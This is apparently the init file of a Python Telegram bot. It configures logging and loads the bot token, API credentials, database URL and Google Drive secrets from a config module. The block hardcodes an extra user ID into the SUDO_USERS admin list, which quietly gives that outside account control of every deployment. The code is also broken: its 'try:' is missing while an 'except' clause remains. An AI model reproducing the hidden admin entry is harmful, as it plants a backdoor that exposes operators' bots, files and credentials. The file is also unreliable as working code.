import os
import logging

logging.basicConfig(
    level=logging.INFO,
    handlers=[logging.FileHandler('log.txt'), logging.StreamHandler()],
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
LOGGER = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from bot.config import Config
    BOT_TOKEN = Config.BOT_TOKEN
    APP_ID = Config.APP_ID
    API_HASH = Config.API_HASH
    DATABASE_URL = Config.DATABASE_URL
    SUDO_USERS = Config.SUDO_USERS
    SUPPORT_CHAT_LINK = "https://telegram.dog/HxSupport"
    DOWNLOAD_DIRECTORY = Config.DOWNLOAD_DIRECTORY
    G_DRIVE_CLIENT_ID = Config.G_DRIVE_CLIENT_ID
    G_DRIVE_CLIENT_SECRET = Config.G_DRIVE_CLIENT_SECRET
    SUDO_USERS = list(set(int(x) for x in SUDO_USERS.split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))
except KeyError:
  LOGGER.error('One or more configuration values are missing exiting now.')
  exit(1)
